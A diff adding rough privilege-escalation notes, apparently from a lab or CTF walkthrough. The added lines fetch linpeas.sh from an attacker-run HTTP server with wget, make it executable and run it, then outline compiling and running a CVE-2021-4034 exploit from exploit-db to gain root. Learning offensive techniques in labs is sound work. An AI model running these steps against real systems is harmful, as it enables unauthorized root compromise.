@@ -310,6 +310,30 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 -----------------------
 EXPLOIT METHOD
 
+1-> get LinPEAS https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+wget it onto the machine from your python server
+
+First cd to the /tmp directory as its universally writeable
+
+wget http://10.10.71.50:8000/linpeas.sh
+
+Make it executable:
+chmod 777 linpeas.sh
+
+./linpeas.sh
+
+Turns out that the system is vulnerable to CVE-2021-4034
+
+
+Download the files from exploit-db and the idea
+
+Is that you will make two C files using the code in the makefile. Exploit.c and Evil-so.c 
+After those two files are made follow the instructions on how to compile them using gcc. Make SURE you compile the C files. 
+Now we can wget the files from our python http server just like we did linpeas. 
+Chmod 777 the two exploit files and then run them to get root access
+(REWRITE THIS WHILE YOU DO IT YOURSELF)
+
 -----------------------
 FIRST CRONTAB METHOD
 navigate to /var/www/html
